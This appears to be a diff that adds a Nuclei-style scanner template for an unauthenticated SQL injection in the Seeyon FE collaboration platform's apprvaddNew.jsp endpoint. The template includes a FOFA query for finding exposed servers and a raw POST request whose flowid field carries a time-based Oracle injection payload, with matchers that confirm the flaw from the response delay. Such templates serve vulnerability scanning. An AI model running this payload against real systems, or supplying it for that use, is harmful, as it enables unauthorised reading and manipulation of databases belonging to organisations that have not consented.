@@ -1,0 +1,28 @@
+id: seeyon-fe-platform-apprvaddnew-sql
+info:
+  name: "致远互联 FE 协作办公平台 apprvaddNew.jsp SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="li_plugins_download"
+          致远互联FE协作办公平台apprvaddNew.jsp接口存在SQL注入安全缺陷，攻击者可利用该漏洞在未授权情况下执行恶意SQL语句，进而读取或操控后端数据库中的敏感数据。
+  tags: 致远互联
+http:
+- raw:
+  - |
+    POST /witapprovemanage/apprvaddNew.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    Content-Type: application/x-www-form-urlencoded
+
+    flowid=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(79)||CHR(116)||CHR(104)||CHR(85),5) AND '1'='1
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=7
+    condition: and
